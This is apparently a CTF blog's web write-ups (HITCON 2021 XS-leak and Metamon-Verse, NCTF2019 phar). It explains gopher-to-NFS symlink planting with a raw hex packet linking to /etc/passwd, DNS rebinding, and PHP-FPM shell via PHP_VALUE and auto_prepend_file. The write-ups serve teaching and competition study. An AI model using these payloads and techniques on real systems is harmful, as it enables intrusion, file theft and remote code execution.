            <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">6000</span>px<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">5000</span>px<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">1000</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1:8000/flag<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre>
<p><code>hitcon&#123;114161e9f94c73e497a75d466c6337f4&#125;</code><br>还要手动加<code>-</code></p>
<h3 id="各种非预期"><a href="#各种非预期" class="headerlink" title="各种非预期"></a>各种非预期</h3><p>比赛结束开始看wp<br>放大iframe也算是非预期，还有一个非预期是dns rebinding<br>原理以前也学过，就是先把域名指向vps，再把域名指向127.0.0.1，但在浏览器看来域名是一样的，这样子就可以绕过同源策略，进行跨域读（这么说来只要进行钓鱼不就是任意跨域读了吗）</p>
<p>虽说由于同源策略，不携带cookie的话拿不到什么有意义的信息，但是如果目标站点是经典前后端分离+localstorage存凭证auth头发送呢？就能做到任意跨域读了</p>
<p>rebinding的核心在于将域名查询结果的ttl设置到0，也就是一次性，这样子在子页面内嵌入一个请求会导致接下来的请求需要重新查询域名，但实际利用似乎并不是非常方便，即使将ttl设定至0，浏览器本身会保存一个分钟级的域名缓存，加上各级DNS服务器可能会对查询结果进行缓存，所以实际上的利用成功率较低，可能需要反复尝试才能成功</p>
<p>所以说虽然究极跨域但是利用成功率也不高啊</p>
<p>以及我看大家外带数据用的都是<code>navigator.sendBeacon()</code>而不是fetch，学一手新的外带方法</p>
<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>利用的是Chrome的一个feature，text fragment，在url锚点（井号）后添加如下格式的内容<br><code>#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</code><br>用户在访问对应链接时会被导航到匹配的文本处并对该文本进行高亮<br>可以直接Chrome划一段文字右键点击<code>复制指向突出内容的链接</code>来看看长什么样（但是Chrome生产出来的内容似乎比较复杂）</p>
<p>那就是一个经典盲注环节了，令url为<code>http://127.0.0.1:8000/flag#:~:text=hitcon&#123;</code>然后开始逐位猜解，猜解正确，则64x64的超级马赛克上会出现一行高亮的像素，否则不出现</p>
<p>但是这个东西。。怎么自动化呢，有点折磨人啊？感觉可能一次梭一位，把所有图片按照提交的字母命名存下来然后手看比较快。。python大师的话整个什么定位像素点看颜色也许也不是不行</p>
<p>看到了国外神仙的解决方案，把未匹配的图片下下来算个md5，然后有高亮的md5就和原始的不一样来做到自动化</p>
<p>文档<br><a href="https://wicg.github.io/scroll-to-text-fragment/">Text Fragments</a></p>
<h2 id="Metamon-Verse"><a href="#Metamon-Verse" class="headerlink" title="Metamon-Verse"></a>Metamon-Verse</h2><p>gopher打NFS，比N1的gopher打mssql还离谱。。。这个东西我都没见过，临时学习ing</p>
<p>NFS全称network file system，感觉就是个分布式的硬盘，允许网络共享的一个文件系统，让用户可以挂载远程机器上的文件系统</p>
<p>题目起了个简单flask服务，提供pycurl服务，可以读取url内容保存到指定目录下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding: UTF-8</span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> sys
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
<span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request

<span class="token keyword">import</span> pycurl
<span class="token keyword">import</span> certifi

PORT <span class="token operator">=</span> <span class="token number">80</span>

<span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    @wraps<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">wrapped_view</span><span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">def</span> <span class="token function">check_auth</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> username <span class="token operator">==</span> <span class="token string">'ctf'</span> <span class="token operator">and</span> password <span class="token operator">==</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'CTF_PASSWD'</span><span class="token punctuation">]</span>
        auth <span class="token operator">=</span> request<span class="token punctuation">.</span>authorization
        <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>auth <span class="token operator">and</span> check_auth<span class="token punctuation">(</span>auth<span class="token punctuation">.</span>username<span class="token punctuation">,</span> auth<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> <span class="token number">401</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                <span class="token string">'WWW-Authenticate'</span><span class="token punctuation">:</span> <span class="token string">'Basic realm="Login Required"'</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>

    <span class="token keyword">return</span> wrapped_view

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'TEMPLATES_AUTO_RELOAD'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
@login_required
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
@login_required
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span><span class="token string">'empty url'</span><span class="token punctuation">)</span>

    opt_name<span class="token punctuation">,</span> opt_value <span class="token operator">=</span> None<span class="token punctuation">,</span> None
    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> key<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'CURLOPT_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            name <span class="token operator">=</span> key<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                opt_name  <span class="token operator">=</span> getattr<span class="token punctuation">(</span>pycurl<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
                opt_name  <span class="token operator">=</span> int<span class="token punctuation">(</span>opt_name<span class="token punctuation">)</span>
                opt_value <span class="token operator">=</span> int<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
            <span class="token keyword">except</span> <span class="token punctuation">(</span>AttributeError<span class="token punctuation">,</span> ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>

            <span class="token keyword">break</span>

    name <span class="token operator">=</span> md5<span class="token punctuation">(</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> url<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    filename <span class="token operator">=</span> <span class="token string">'static/images/%s.jpg'</span> <span class="token operator">%</span> name
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
        c <span class="token operator">=</span> pycurl<span class="token punctuation">.</span>Curl<span class="token punctuation">(</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>c<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
        c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>c<span class="token punctuation">.</span>WRITEDATA<span class="token punctuation">,</span> fp<span class="token punctuation">)</span>
        c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>c<span class="token punctuation">.</span>CAINFO<span class="token punctuation">,</span> certifi<span class="token punctuation">.</span>where<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> opt_name <span class="token operator">and</span> opt_value<span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>setopt<span class="token punctuation">(</span>opt_name<span class="token punctuation">,</span> opt_value<span class="token punctuation">)</span>
        
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>perform<span class="token punctuation">(</span><span class="token punctuation">)</span>
            c<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            msg <span class="token operator">=</span> filename
        <span class="token keyword">except</span> pycurl<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            msg <span class="token operator">=</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'debug'</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>
        app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
        PORT <span class="token operator">=</span> <span class="token number">8000</span>

    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
</code></pre>
<p>这里设置了<code>app.config[&#39;TEMPLATES_AUTO_RELOAD&#39;] = True</code>，在模板更新后会更新渲染新的模板文件<br>然后Dockerfile里面用apt装了一个nfs-common，在entrypoint.sh里面挂载了nfs的文件目录</p>
<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># service</span>
<span class="token function">mkdir</span> /data
<span class="token function">ln</span> -s /data/ /app/static/images
<span class="token function">mount</span> -t nfs nfs.server:/data /data -o nolock
</code></pre>
<p>我们存文件的images目录实际上是data目录的软链接，而data目录实际上又是挂载的nfs远程文件系统，也就意味着我们写下的文件实际上都是写到了nfs文件系统中</p>
<p>后续的hint中给出了nfs.server的搭建过程</p>
<pre class=" language-bash"><code class="language-bash">$ apt <span class="token function">install</span> -y nfs-kernel-server nfs-common rpcbind
$ <span class="token function">cat</span> /etc/export
/data    172.16.0.0/12<span class="token punctuation">(</span>rw,sync<span class="token punctuation">)</span>
$ <span class="token function">mkdir</span> /data
$ <span class="token function">chown</span> nobody.nogroup /data
$ <span class="token function">service</span> nfs-kernel-server start
</code></pre>
<p>这样子的话，这个环境是只给出了一个APP的源码，实际上还启动了一个nfs的容器（后来发现不是NFS容器，是直接宿主机启动NFS服务），设置了exports的规则使docker网段内的所有主机均可访问该目录<br>（然后可以读&#x2F;etc&#x2F;hosts找到nfs.server的地址，或者。。。直接访问nfs.server这个名字。。。）上次学到的知识点</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我觉得能提出这个攻击思路就很不错了。。。curl支持gopher协议，支持gopher协议就等于能发送任意tcp数据包<br>通过gopher协议和nfs.server进行通信，因为nfs.server就是一个文件系统，直接在nfs.server上创建一个软链接，名字就是我们可以写入的xxx.jpg，软链接到&#x2F;template&#x2F;index.html，再进行一次访问，将我们的payload写入xxx.jpg，实际上就是写入了模板，模板可控，打模板渲染ssti</p>
<p>但是问题在于，mssql那个题还有一个曾经的参考链接，这个nfs可是啥也没有，又是一个从零开始的手搓流量</p>
<h3 id="socket2gopher代理"><a href="#socket2gopher代理" class="headerlink" title="socket2gopher代理"></a>socket2gopher代理</h3><p>这里观察到了神仙们非常骚的流量操作。<br>首先是在本地虚拟机中搭建docker环境，然后写下一个简易代理，大致操作就是开一个socket链接，把收到的byte全部url编码之后改成gopher形式的payload发给APP，这样子APP就等于是发出去了原生的tcp数据，与nfs server容器进行交互，然后直接起一个NFS客户端，连接简易代理监听的端口，然后在本地虚拟机中开wireshark听流量debug（如果这个简易代理打通了本地，理论上也能打通远程）</p>
<p>但是这里有一个很大的问题，gopher的缺陷在于他发一次流量就是一个完整的tcp链接，也就是说如果nfs协议在通信过程中需要来回交互的话，gopher应该是打不通的。</p>
<p>NFS有三个正式版本，v2 v3 v4，v2过于古老，但为了兼容性仍然存在，v3理论上是最为广泛使用的协议，v4新版协议和v2&#x2F;3存在较大差异</p>
<p>并没有找到很多关于协议细节的内容。。。但是从互联网上的文章来看，v4由于弃用了portmap等功能，能够更好的进行防火墙的穿透，在通信协议上变得更为复杂，需要在一次tcp连接中进行多次交互，理论上不符合gopher一把梭的原则</p>
<p>好消息是，NFS server一般来说同时支持上述三个协议，使用的协议类型可在连接发起时进行协商，也就意味着就算对方是最新版本的NFS server，也能够使用老版本的协议进行攻击</p>
<p>问了问rmb神仙有没有协议沟通细节，然后直接给我丢了个RFC让我去搜。。。我爬了<br><strong>- update RFC NB！看RFC真的有用</strong></p>
<h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p>尝试搭建环境然后wireshark硬看交互<br>然后踩了一晚上的坑。。。。<br>docker使用的是命名空间隔离，在一定程度上还是依赖于宿主机的内核，比如NFS就属于内核模块，所以你在docker里面apt install了nfs在宿主机里面没装还是跑不起来，但在宿主机里面装了也不意味着在docker里面就能跑的起来，会一直显示<code>/proc/fs/nfs/exports</code>这个文件permission denied，那我再给docker加一个<code>privileged</code>吧，还是跑不起来。。。谷歌并搜不到什么类似信息，自闭ing<br>然后去搜了一个已经打包好的nfs的docker，发现在文档里面写着启动的时候是把需要用nfs共享的文件夹直接从host中挂载进docker，然后再用docker共享出去，同时提及了我之前踩的宿主机需要安装对应内核模块和docker需要<code>privileged</code>权限运行的坑。。。<br>看来挂载操作也不是完全隔离的，起码nfs可能只能在宿主机上跑起来了。。。也不是不行，反正是虚拟机，快照一拍随便玩。。。在虚拟机上搭nfs，然后docker随便开个客户端连接吧</p>
<p>接下来理论上是不会踩坑的，但是我还是踩了，还是一个大家都没见过的坑<br>直接看orange公布的源码看他是怎么搭建环境的，也就是在host上搭NFS服务，然后启动docker<br><a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2021/Metamon-Verse/Makefile">orangetw&#x2F;My-CTF-Web-Challenges&#x2F;hitcon-ctf-2021&#x2F;Metamon-Verse&#x2F;Makefile</a><br>这里有一个比较技巧性的参数<code>--add-host=nfs.server:host-gateway</code>，add-host这个参数就是用于直接添加一个主机名到ip的映射，就像docker-compose里面的主机名一样，host-gateway就是和docker位于同一网段的host的ip地址。然后要<code>--privileged</code>给与挂载权限</p>
<p>docker的默认网段应该是docker0对应的网段，我的机器上是<code>172.17.0.0/24</code>，所以配置如下<code>/etc/exports</code>文件</p>
<pre><code>/data    172.17.0.0/24(rw,sync)
</code></pre>
<p>创建data目录创建用来提供挂载，chown为<code>nouser.nogroup</code>，开放权限</p>
<p>理论上这个时候进docker用<code>mount -t nfs nfs.server:/data /data -o nolock</code>就万无一失了，然而这里我踩了一个究极大坑</p>
<p>其实看过师傅们做题时的讨论就会知道，NFS有一个非常脑溢血的设定，他认为连接发起方使用的端口号若小于1024，则认为其是一个安全的连接，否则认为其是不安全连接，拒绝进行操作，client会得到一个<code>Operation not permitted</code>，进wireshark抓流量就是看到一个<code>NFS4ERR_PERM</code></p>
<p>然后，我专门wireshark看了我的端口，均小于1024，但仍然报错<br>rmb神仙的建议是查看privileged是否真的给到了，然后我随便挂载了一个目录，非常成功，甚至可以进行docker逃逸<br>rmb神仙的第二个建议是使用strace跟踪系统调用，看哪个系统调用出现了问题，简直就是屠龙之术。。。这谁看得懂，我急速爬<br>疯狂百度最后找到了NFS输出详细log的方法，NFS属于内核模块，所以输出都是在<code>/var/log/messages</code>，但默认输出的粒度太粗了，根本没有详细信息，使用rpcdebug可以让其输出详细信息。<br><code>rpcdebug -m nfsd all</code>启动，<code>rpcdebug -m nfsd -c all</code>关闭<br>然后我就看到了极其困惑的报错</p>
<pre><code>nfsd: request from insecure port 172.17.0.2, port=757!
</code></pre>
<p>小于1024你也insecure？真有你的，怎么办呢，搜了一下，把export里面再加一个insecure选项就行了。终于连上了。。。。</p>
<h3 id="V3协议观察"><a href="#V3协议观察" class="headerlink" title="V3协议观察"></a>V3协议观察</h3><p>wireshark进行观察，在-o中添加vers&#x3D;3指定使用v3版本的协议进行沟通，整个的通讯过程大致如下</p>
<ol>
<li>与111端口的portmap通信，查找NFS服务端口，得到2049（这种东西不应该是熟知端口之类的东西吗，还要查）</li>
<li>客户端向NFS发起了一个NULL CALL，NFS回了一个NULL REPLY（我猜是在验证是否这个端口上有一个NFS服务）<strong>该步骤可省略</strong></li>
<li>客户端继续与portmap通信，查找MOUNT服务端口，得到33936，进行UDP通信</li>
<li>客户端与MOUNT进行通信，取得挂载目录的file handler（这个handler用于后续和NFS通信）</li>
<li>客户端与NFS通信，开始对文件系统进行操作，操作也就是client这边发一个XXX CALL，server那边就回一个XXX REPLY，整个连接是一个长连接，还会持续发心跳包来keep alive</li>
<li>当umount文件系统时，先与MOUNT服务进行通信，umount掉目录，然后和NFS的TCP连接断开</li>
</ol>
<p>似乎在v3协议中，似乎不需要考虑过多的交互过程，因为整体操作只有如上几步，可以简化为：<br>查询portmap拿到mount port，连接mount port拿到file handler，使用file handler访问文件系统</p>
<p>这种一次连接就交互一次的做法较为简单，也符合gopher一次连接只能发送一个请求的特点，也是官方的预期解，具体脚本参考文末链接</p>
<h3 id="V4协议观察"><a href="#V4协议观察" class="headerlink" title="V4协议观察"></a>V4协议观察</h3><p>比V3要麻烦一点？去除了portmap找MOUNT服务端口和找NFS服务端口环节，直接和NFS的熟知端口2049通信，并且在通信过程中确定file handler（就不需要找MOUNT服务要了）<br>并且能够一次请求调用多个方法，行诶，大致步骤如下</p>
<ol>
<li>和3类似，进行NULL CALL调用，应该是用来验证是否运行了NFS服务，<strong>非必须</strong></li>
<li>协商clientID，调用SETCLIENTID方法，协商出来一个ID，然后还要再SETCLIENTID_CONFIRM，暂不知道这个ID能干嘛<blockquote>
<p>看完RFC后发现这个CILENTID用于对文件进行LOCK操作，应该就是指读写锁和异步之类的？<strong>该步骤非必须</strong></p>
</blockquote>
</li>
<li>然后就是各种方法的调用，常见的就是PUTFH，GETATTR几个方法，PUTFH是将输入的file handler设定为当前操作上下文的file handler，GETATTR就是获取属性，还有LOOKUP，OPEN，GETFH之类的操作，对应不同的对文件系统的操作吧</li>
<li>直到umount断开连接</li>
</ol>
<p>V4和V3之间有一个明显的差距，就观察的情况而言，V4需要在一个tcp连接中完成获取file handler和操作file handler的操作，相较于V3从MOUNT处拿到file handler再和NFS交互操作file handler，似乎无法在gopher中一次性打通？</p>
<p>要不，再看一眼RFC？<br><a href="https://www.rfc-editor.org/rfc/rfc3010.html">NFSv4 RFC</a><br>看了一半RFC顺便听了科恩的讲解环节，我又完全懂了</p>
<h3 id="题解-非预期"><a href="#题解-非预期" class="headerlink" title="题解(非预期?)"></a>题解(非预期?)</h3><p>科恩的师傅还提到了在实际利用时的困难，因为NFS协议是keep alive的长连接，还会用心跳包一直续连接，那么gopher一个包发过去之后连接不会断开，这样子也就拿不到结果，所以设置的CURL_OPTION一开始为timeout，自动断开就能拿到结果。后续发现，只要在标准协议的包后面加一些不符合协议的脏数据就能报错断开连接了</p>
<p>所以CURL OPTION是用于解决第二个问题，NFS傻逼协议设计上的端口号大小。NFS本身可能是一个非常老的协议，所以不知道他为什么会觉得使用1024以内端口号的用户比较靠谱，并在进行操作时拒绝源端口大于1024的连接的请求，通过<code>CURLOPT_LOCALPORT</code>可以指定发起请求时的源端口，这样就能过这个愚蠢的安全监测（环境搭建时也提到过，而我的本地环境啥端口都显示insecure。。。）</p>
<p>现在的问题在于file handler的获取需要进行交互，而gopher的tcp流是不支持交互的。<br>直接看流量也可以看到，v4版本的协议支持一个请求进行多个操作，于是我们看到这几个操作<br><code>PUTROOTFH</code>，这个操作不需要参数，效果是将挂载目录的根目录的file handler放入当前操作上下文(current file handler)，V4协议中的操作基本都是围绕着cfh进行的</p>
<blockquote>
<p>Replaces the current filehandle with the filehandle that represents the root of the server’s name space.  From this filehandle a LOOKUP operation can locate any other filehandle on the server.</p>
</blockquote>
<p>这里也有一个小坑，除去PUTROOTFH外，还有一个PUTFH方法，这个方法需要一个参数FH，然后把cfh设置为传入的FH，因为我们没有数据，所以无法获取到FH，只能调用PUTROOTFH将根目录放入cfh。但这里并不是将挂载点的根目录（也就是<code>/data</code>）放入cfh，而是将server的根目录放入cfh，而实际上共享出来的文件夹只有&#x2F;data，虽然<code>From this filehandle a LOOKUP operation can locate any other filehandle on the server.</code>，但只有被共享出来的文件夹才能被访问，剩下的都是permission denied。。。我一开始因为是直接能到&#x2F;data目录的file handler放进cfh，所以对接下来的lookup操作感到困惑</p>
<p>这里提到可以用<code>LOOKUP</code>来定位任意其他的file handler，文档提到LOOKUP<br>这个方法接受一个参数path，然后在cfh下寻找改path，并将cfh替换为寻找到的fh，而这个path直接是一个string，设置为<code>/data</code>即可</p>
<p>把上述两个方法结合起来，就可以在不知道任何file handler的情况下将任意file handler放入cfh了</p>
<p>最后使用CREATE方法创建一个non-regular file，也就是我们的软链接文件，这个方法接受两个参数，文件名和文件类型</p>
<blockquote>
<p>The CREATE operation creates a non-regular file object in a directory with a given name.  The OPEN procedure MUST be used to create a regular file.</p>
</blockquote>
<p>大致意思就是说创建普通文件用OPEN方法，特殊文件用CREATE，应该是指在cfh下创建文件吧</p>
<p>至于之前的协商CLIENTID，看了一下说明，还真没什么用，只是用于后续如果要对文件进行读写锁的话，需要用这个ID进行表示，所以还真能一个包打通，tql</p>
<blockquote>
<p>The SETCLIENTID operation introduces the ability of the client to notify the server of its intention to use a particular client identifier and verifier pair.  Upon successful completion the server will return a clientid which is used in subsequent file locking requests and a confirmation verifier.  The client will use the SETCLIENTID_CONFIRM operation to return the verifier to the server.  At that point, the client may use the clientid in subsequent operations that require an nfs_lockowner.</p>
</blockquote>
<p>至于怎么搓流量，明天再说（</p>
<p>流量搓完了，确实不需要CLIENTID，并且NFS的协议整个数据结构非常简单，一个请求调用多个方法只需要在标明调用的方法数量，然后把之前的流量复制粘贴出来拼起来重放即可</p>
<p>然后还和做出这道题的师傅交流了一下，提到了CREATE时能不能直接带上路径，这样子就能少一步lookup，直接在PUTROOTFH后CREATE，但实际测试时SERVER回了一个报错，内容是NFS4_BADNAME，NFS4的RFC里面居然没有这个报错？可能是之前老版本定义的这里不重复了？然后我也有点想躺平了，暂时认为不允许文件名出现斜杠吧，所以还是得先lookup到对应目录下，毕竟create也写了是在那个目录下创建文件嘛</p>
<p>包结构就长这样，非常简单，RPC的身份认证，似乎因为这里的设置为来自该网段的机器均运行，所以并不需要多虑，而NFS协议本身的内容就只要简单的把方法名和数据堆积起来就可以了<br><img src="/images/%5BHITCON2021%5Dweb/image-20211209175555759.png" alt="image-20211209175555759"></p>
<p>顺便贴一下搓的流量？</p>
<pre><code>80000098a75822c90000000000000002000186a300000004000000010000000100000020000000000000000c6639653130616164393535650000000000000000000000000000000000000000000000000000000000000003000000180000000f000000046461746100000006000000050000000b2f6574632f70617373776400000000046c696e6b00000002000000000000000200000004000001ff
</code></pre>
<p>实现了创建一个&#x2F;data&#x2F;link软链接，链接到&#x2F;etc&#x2F;passwd</p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>orange和一些国外神仙给出的wp，都是利用V3协议分别交互获取file handler和写入软链接的，这样子能更清楚的进行操作，以及可以使用玄幻的socket2gopher proxy，orange则是自己手搓协议数据包，wp分别如下，同理，CURL OPT选择的是local port，而不是超时退出，因此都在数据包的末尾增加了垃圾数据以主动断开连接<br><a href="https://gist.github.com/orangetw/6d34ff98a6332bc0523b35ea952a790d">orangetw&#x2F;exp-metamon-verse.py</a><br><a href="https://r0.haxors.org/posts?id=27">HITCON CTF 2021 Metamon-Verse Writeup</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>gopher</tag>
      </tags>
  </entry>
  <entry>
    <title>[NCTF2019]phar matches everything</title>
    <url>/%5BNCTF2019%5Dphar%20matches%20everything.html</url>
    <content><![CDATA[<h1 id="NCTF2019-phar-matches-everything"><a href="#NCTF2019-phar-matches-everything" class="headerlink" title="[NCTF2019]phar matches everything"></a>[NCTF2019]phar matches everything</h1><p>BUU继续重拳出击，总觉得刷题的意义正在逐渐消失，不想这么单纯的刷体了，感觉只能让我成为一个赛棍。应该学点什么，以后水一点的题就不记了，起码要学到一点点东西再说</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>buu上给出了源码，两个关键文件，一个文件上传，一个反序列化，文件上传限制了后缀和文件名，反序列化处有一个经典用phar来触发的操作，反序列化的结果就是一次curl</p>
<p>反序列化的操作非常简单不在赘述，稍微要考虑一下的就是文件上传。检测后缀对phar来说并没有什么问题，因为phar协议指定去读一个文件也不管他是什么后缀。唯一要过的点就是那个imagesize函数的检测，也很简单，用那个经典的<code>#define width 1</code>就能过，就放在那个压缩进phar的文件里就行，要另起一行才能正确识别</p>
<p>传上去phar触发反序列化，从buu给的源码里已经看到了是要打内网一个FPM了，估计是这个FPM还设定了监听0.0.0.0:9000，所以要先摸出来这个机子所在的ip段。读<code>/proc/net/arp</code>可以得到当前机子的ip，网段内加几下就能找到那台FPM主机的ip</p>
<p>使用经典攻击FPM脚本生成流量，用gopher一把梭。<br>这里的攻击思路之前都没注意，还是这回现学的，之前是用FPM去bypass disable function，那是已经拥有了对机器的shell，所以是传一个.so上去，用<code>PHP_VALUE</code>修改PHP配置，加载.so。然后直接用这个.so执行命令来绕过disable function</p>
<p>这里我没有目标机器的shell，就得先攻击FPM拿到一个shell。同样是修改<code>PHP_VALUE</code>，添加一个<code>auto_prepend_file=php://input</code>，再在<code>PHP_ADMIN_VALUE</code>中开启<code>allow_url_include=On</code>，就可以直接include POST的数据，在没有目标机器任何权限的情况下变出来一个shell。<br>拿到shell之后依旧是disable funcion+open basedir拉满，不过这里由于可以控制<code>PHP_ADMIN_VALUE</code>，可以自行修改disable function和open basedir，不过由于disable func只能增不能减，就算修改了也只是增加过滤，因此直接加一条<code>open_basedir=none</code>直接读取根目录flag</p>
